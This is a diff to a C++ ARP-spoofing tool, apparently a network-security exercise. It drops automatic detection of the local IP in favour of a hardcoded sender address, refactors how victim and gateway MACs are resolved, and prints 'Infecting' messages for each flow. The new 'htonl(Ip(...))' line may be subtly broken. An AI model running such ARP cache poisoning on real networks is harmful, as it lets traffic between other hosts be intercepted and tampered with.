@@ -32,28 +32,6 @@ struct Flow {
     Mac targetMac;
 };
 
-Ip getMyIp(const char* dev) {
-    struct ifreq ifr;
-    int sock = socket(AF_INET, SOCK_DGRAM, 0);
-    if (sock < 0) {
-        perror("socket");
-        exit(1);
-    }
-    std::memset(&ifr, 0, sizeof(ifr));
-    std::strncpy(ifr.ifr_name, dev, IFNAMSIZ-1);
-    ifr.ifr_addr.sa_family = AF_INET;
-
-    if (ioctl(sock, SIOCGIFADDR, &ifr) < 0) {
-        perror("ioctl(SIOCGIFADDR)");
-        close(sock);
-        exit(1);
-    }
-    close(sock);
-
-    auto* sin = reinterpret_cast<struct sockaddr_in*>(&ifr.ifr_addr);
-    return Ip(ntohl(sin->sin_addr.s_addr));
-}
-
 Mac getMyMac(const char* dev) {
     struct ifreq ifr;
     int sock = socket(AF_INET, SOCK_DGRAM, 0);
@@ -67,7 +45,7 @@ Mac getMyMac(const char* dev) {
     return Mac((uint8_t*)ifr.ifr_hwaddr.sa_data);
 }
 
-Mac getMacByArp(pcap_t* handle, Mac myMac, Ip myIp, Ip ip) {
+Mac getMacByArp(pcap_t* handle, Mac myMac, Ip ip) {
     EthArpPacket packet;
     packet.eth_.dmac_ = Mac::broadcastMac();
     packet.eth_.smac_ = myMac;
@@ -79,7 +57,7 @@ Mac getMacByArp(pcap_t* handle, Mac myMac, Ip myIp, Ip ip) {
     packet.arp_.pln_ = Ip::Size;
     packet.arp_.op_  = htons(ArpHdr::Request);
     packet.arp_.smac_ = myMac;
-    packet.arp_.sip_ = htonl(myIp.toHostOrder());
+    packet.arp_.sip_ = htonl(Ip("10.1.1.77"));
     packet.arp_.tmac_ = Mac::nullMac();
     packet.arp_.tip_ = htonl(ip);
 
@@ -182,22 +160,24 @@ int main(int argc, char* argv[]) {
     }
     printf("[*] Attacker MAC: %s\n", std::string(myMac).c_str());
 
-		Ip myIp = getMyIp(dev);
-		    printf("[*] Attacker IP: %s\n", myIp.toString().c_str());
-
     std::map<Ip, Mac> arpTable;
     std::vector<Flow> flows;
 
-		for (int i = 2; i < argc; i += 2) {
-		    Flow f{ Ip(argv[i]), {}, Ip(argv[i+1]), {} };
-		    if (!arpTable.count(f.senderIp))
-		        arpTable[f.senderIp] = getMacByArp(handle, myMac, myIp, f.senderIp);
-		    if (!arpTable.count(f.targetIp))
-		        arpTable[f.targetIp] = getMacByArp(handle, myMac, myIp, f.targetIp);
-		    f.senderMac = arpTable[f.senderIp];
-		    f.targetMac = arpTable[f.targetIp];
-		    flows.push_back(f);
-}
+    for (int i = 2; i < argc; i += 2) {
+        Flow f;
+        f.senderIp = Ip(argv[i]);
+        f.targetIp = Ip(argv[i + 1]);
+
+        if (arpTable.find(f.senderIp) == arpTable.end())
+            arpTable[f.senderIp] = getMacByArp(handle, myMac, f.senderIp);
+        if (arpTable.find(f.targetIp) == arpTable.end())
+            arpTable[f.targetIp] = getMacByArp(handle, myMac, f.targetIp);
+
+        f.senderMac = arpTable[f.senderIp];
+        f.targetMac = arpTable[f.targetIp];
+
+        flows.push_back(f);
+    }
 
     for (const auto& f : flows) {
         printf("[+] Infecting %s (MAC: %s) to redirect to %s\n",
